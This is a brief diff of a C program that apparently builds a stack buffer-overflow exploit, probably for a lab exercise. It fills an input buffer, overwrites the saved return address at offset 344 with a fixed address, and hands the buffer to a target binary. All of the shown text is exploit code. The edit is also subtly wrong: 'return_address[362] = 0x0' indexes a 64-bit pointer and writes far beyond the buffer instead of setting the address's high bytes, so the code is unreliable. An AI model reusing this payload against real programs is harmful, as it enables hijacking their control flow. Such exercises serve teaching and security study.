@@ -30,11 +30,9 @@ main ( int argc, char * argv[] )
         input[i + 40] = i % 254 + 1;
     }
 
-    /* TODO: figure out how to write the high 4 bytes of zero */
     uint64_t *return_address = (uint64_t *) &input[344];
     *return_address = 0x40A4FD70;
-    input[348] = 0x7f;
-    input[349] = 0x00;
+    return_address[362] = 0x0;
 
     args[0] = TARGET;
     args[1] = (char *) input;
